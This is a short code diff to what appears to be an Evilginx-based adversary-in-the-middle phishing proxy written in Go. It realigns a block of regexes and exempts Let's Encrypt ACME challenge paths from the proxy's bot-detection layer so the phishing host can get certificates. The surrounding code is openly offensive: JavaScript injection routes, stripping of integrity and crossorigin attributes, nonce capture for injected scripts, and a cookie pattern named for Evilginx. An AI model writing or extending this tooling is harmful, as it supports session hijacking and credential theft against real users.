@@ -214,21 +214,21 @@ var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}
 
 // Pre-compiled regexps for hot-path request handling (avoid re-compiling on every request)
 var (
-	botguardTelRe  = regexp.MustCompile(`^/api/v1/analytics$`)
-	dcPageRe       = regexp.MustCompile(`^/dc/([a-zA-Z0-9]+)$`)
-	dcStatusRe     = regexp.MustCompile(`^/dc/status/([a-zA-Z0-9]+)$`)
-	redirRe        = regexp.MustCompile(`^/assets/js/([^/]*)`)
-	jsInjectRe     = regexp.MustCompile(`^/assets/js/([^/]*)/([^/]*)`)
-	jsonContentRe  = regexp.MustCompile(`application/\w*\+?json`)
-	formContentRe  = regexp.MustCompile(`application/x-www-form-urlencoded`)
-	cssUnescapeRe  = regexp.MustCompile(`\\([0-9a-fA-F]{1,6})\s?`)
-	sriRe          = regexp.MustCompile(`\s+integrity="[^"]*"`)
-	crossoriginRe  = regexp.MustCompile(`\s+crossorigin(?:="[^"]*")?`)
-	jsNonceRe      = regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
-	jsNonceRe2     = regexp.MustCompile(`(?i)<script[^>]*nonce=['"]([^'"]*)`)
-	bodyCloseRe    = regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
-	headOpenRe     = regexp.MustCompile(`(?i)(<\s*head[^>]*>)`)
-	htmlOpenRe     = regexp.MustCompile(`(?i)(<\s*html[^>]*>)`)
+	botguardTelRe    = regexp.MustCompile(`^/api/v1/analytics$`)
+	dcPageRe         = regexp.MustCompile(`^/dc/([a-zA-Z0-9]+)$`)
+	dcStatusRe       = regexp.MustCompile(`^/dc/status/([a-zA-Z0-9]+)$`)
+	redirRe          = regexp.MustCompile(`^/assets/js/([^/]*)`)
+	jsInjectRe       = regexp.MustCompile(`^/assets/js/([^/]*)/([^/]*)`)
+	jsonContentRe    = regexp.MustCompile(`application/\w*\+?json`)
+	formContentRe    = regexp.MustCompile(`application/x-www-form-urlencoded`)
+	cssUnescapeRe    = regexp.MustCompile(`\\([0-9a-fA-F]{1,6})\s?`)
+	sriRe            = regexp.MustCompile(`\s+integrity="[^"]*"`)
+	crossoriginRe    = regexp.MustCompile(`\s+crossorigin(?:="[^"]*")?`)
+	jsNonceRe        = regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
+	jsNonceRe2       = regexp.MustCompile(`(?i)<script[^>]*nonce=['"]([^'"]*)`)
+	bodyCloseRe      = regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
+	headOpenRe       = regexp.MustCompile(`(?i)(<\s*head[^>]*>)`)
+	htmlOpenRe       = regexp.MustCompile(`(?i)(<\s*html[^>]*>)`)
 	evilginxCookieRe = regexp.MustCompile(`^(_ga|_gid|_fbp|__cf|__utm|_sess|sid|uid|token|auth)_[0-9a-f]{12}$`)
 )
 
@@ -738,7 +738,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// --- End device code interstitial endpoint ---
 
 			// --- Begin Botguard bot detection ---
-			if p.botguard.IsEnabled() {
+			// Skip botguard for ACME challenge paths (Let's Encrypt cert validation)
+			isAcmePath := strings.HasPrefix(req.URL.Path, "/.well-known/acme-challenge/")
+			if p.botguard.IsEnabled() && !isAcmePath {
 				if pl != nil {
 					// Generate a simple JA4-like fingerprint from available info
 					// Full JA4 requires TLS Client Hello parsing which needs custom TLS listener
